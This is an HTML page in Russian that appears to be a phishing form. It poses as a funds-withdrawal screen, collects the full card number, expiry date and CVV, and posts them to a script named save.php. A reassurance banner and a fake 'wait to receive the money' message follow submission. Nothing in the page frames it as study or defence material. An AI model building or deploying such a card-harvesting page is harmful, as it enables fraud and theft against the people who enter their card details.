<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Вывод средств</title>
<link rel="stylesheet" href="style.css" />
</head>
<body>

<h2>Вывод средств</h2>
<form id="withdrawForm" action="save.php" method="POST">
  <label>Номер карты:<br />
    <input type="text" name="cardNumber" required pattern="\d{16}" title="Введите 16 цифр номера карты" />
  </label><br />
  <label>Дата действия:<br />
    <input type="month" name="expiryDate" required />
  </label><br />
  <label>Код с задней стороны:<br />
    <input type="text" name="cvv" required pattern="\d{3}" title="Введите 3 цифры CVV" />
  </label><br />
  <p style="color:red; font-weight:bold;">Внимание! Данные карты используются только для обработки вывода.</p>
  <button type="submit">Продолжить</button>
</form>

<p id="waitingMsg" style="display:none;">Ожидайте получения денег...</p>

<script>
  const form = document.getElementById('withdrawForm');
  const waitingMsg = document.getElementById('waitingMsg');

  form.addEventListener('submit', (e) => {
    e.preventDefault();
    form.style.display = 'none';
    waitingMsg.style.display = 'block';
    form.submit();
  });
</script>

</body>
</html>
